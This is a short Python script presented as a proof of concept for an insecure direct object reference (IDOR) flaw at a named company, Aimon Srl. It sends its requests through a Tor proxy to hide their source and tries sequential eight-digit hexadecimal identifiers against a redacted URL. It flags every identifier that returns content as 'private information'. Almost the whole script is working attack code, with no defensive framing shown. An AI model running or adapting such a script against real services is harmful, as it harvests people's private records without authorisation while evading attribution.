#!/usr/bin/env python3
# IDOR PoC for Aimon Srl

from itertools import product
from os import system
import requests

height = 291441
combos = 16**8
url = "REDACTED"

def torify():
    session = requests.session()
    session.proxies = {'https': 'socks5://REDACTED:9050'}
    return session

def hexgen(i):
    while i < combos:
        yield "{:08X}".format(i)
        i += 1

session = torify()
for code in hexgen(height):
	print(f"trying {code}")
	r = session.get(url + code)
	if r.text:
		print(f"Found private information at: {url}{code}")

